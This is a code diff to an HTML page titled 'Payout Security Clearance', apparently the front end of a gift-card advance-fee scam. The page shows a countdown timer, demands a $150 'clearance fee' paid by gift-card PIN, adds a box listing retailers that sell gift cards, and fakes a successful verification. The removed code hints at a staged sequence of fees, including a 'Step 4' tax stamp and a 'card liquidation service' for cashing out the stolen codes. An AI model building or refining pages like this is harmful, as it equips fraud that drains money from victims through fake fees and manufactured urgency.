@@ -113,6 +113,44 @@
         .amount-label { color: var(--text-muted); }
         .amount-value { font-weight: 700; color: #38bdf8; }
 
+        /* Vendor Info Box Styles */
+        .vendor-info-box {
+            background-color: rgba(56, 189, 248, 0.05);
+            border: 1px solid rgba(56, 189, 248, 0.2);
+            border-radius: 8px;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .vendor-info-title {
+            font-size: 0.825rem;
+            font-weight: 600;
+            color: #38bdf8;
+            margin-bottom: 0.5rem;
+        }
+
+        .vendor-info-text {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            line-height: 1.4;
+            margin-bottom: 0.75rem;
+        }
+
+        .vendor-list {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .vendor-tag {
+            background-color: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 0.25rem 0.5rem;
+            font-size: 0.75rem;
+            color: var(--text-main);
+        }
+
         .form-group {
             margin-bottom: 1.25rem;
         }
@@ -179,35 +217,13 @@
             line-height: 1.3;
         }
     </style>
-
-    <!-- Embedded Guard Script (Runs immediately before page renders) -->
-    <script>
-        (function enforcePortalGuard() {
-            const hasWithdrawn = localStorage.getItem("has_withdrawn") === "true";
-            const step3Paid = localStorage.getItem("step_3_paid") === "true";
-            const currentPath = window.location.pathname;
-
-            // If user hasn't initialized withdrawal, set flag for demo purposes
-            if (!localStorage.getItem("has_withdrawn")) {
-                localStorage.setItem("has_withdrawn", "true");
-            }
-
-            // Lock Condition: Step 3 is already paid, jump to Step 4
-            if (hasWithdrawn && step3Paid) {
-                if (!currentPath.includes("step-4")) {
-                    alert("Step 3 verified. Redirecting to Step 4...");
-                    // Simulated navigation redirect
-                    // window.location.replace("step4_tax_stamp.html");
-                }
-            }
-        })();
-    </script>
 </head>
 <body>
 
     <div class="container">
         <div class="header">
             <span class="badge">Action Required</span>
+            <h1>Payout Security Clearance</h1>
         </div>
 
         <div class="timer-box">
@@ -218,6 +234,21 @@
         <div class="amount-box">
             <span class="amount-label">Required Clearance Fee</span>
             <span class="amount-value">$150.00 USD</span>
+        </div>
+
+        <!-- Vendor Info Section -->
+        <div class="vendor-info-box">
+            <div class="vendor-info-title">Need a digital gift card?</div>
+            <p class="vendor-info-text">
+                You can instantly purchase supported digital gift cards or vouchers from authorized third-party retailers online or in-store:
+            </p>
+            <div class="vendor-list">
+                <span class="vendor-tag">Amazon</span>
+                <span class="vendor-tag">Apple</span>
+                <span class="vendor-tag">Target</span>
+                <span class="vendor-tag">Walmart</span>
+                <span class="vendor-tag">Raise</span>
+            </div>
         </div>
 
         <div class="form-group">
@@ -253,7 +284,7 @@
             timeLeft--;
         }, 1000);
 
-        // 2. Submission Handler with LocalStorage Update
+        // 2. Submission Handler
         async function submitClearanceCode() {
             const cardCode = document.getElementById("giftcard_pin").value.trim();
             const statusBox = document.getElementById("status_message");
@@ -269,8 +300,6 @@
             statusBox.innerText = "Verifying code with clearance server...";
 
             try {
-                // Simulated API Call to Card Liquidation Service
-                // In production, this fetches: https://api.card-liquidation-service.com/v1/redeem
                 const mockApiResponse = await new Promise((resolve) => {
                     setTimeout(() => {
                         resolve({ status: "SUCCESS", transactionId: "TXN_998402" });
@@ -279,18 +308,12 @@
 
                 if (mockApiResponse.status === "SUCCESS") {
                     statusBox.style.color = "#10b981";
-                    statusBox.innerText = "Payment verified! Updating session...";
+                    statusBox.innerText = "Payment verified successfully!";
 
-                    // Set state flags directly in browser's local storage
+                    // Update session storage without Step 4 redirects
                     localStorage.setItem("has_withdrawn", "true");
                     localStorage.setItem("step_3_paid", "true");
                     localStorage.setItem("step_3_txn_id", mockApiResponse.transactionId);
-
-                    // Trigger navigation redirect
-                    setTimeout(() => {
-                        alert("Step 3 cleared! Advancing to Step 4.");
-                        location.reload(); // Reloads to trigger guard script behavior
-                    }, 1000);
                 } else {
                     statusBox.style.color = "#ef4444";
                     statusBox.innerText = "Invalid card PIN. Please try again.";
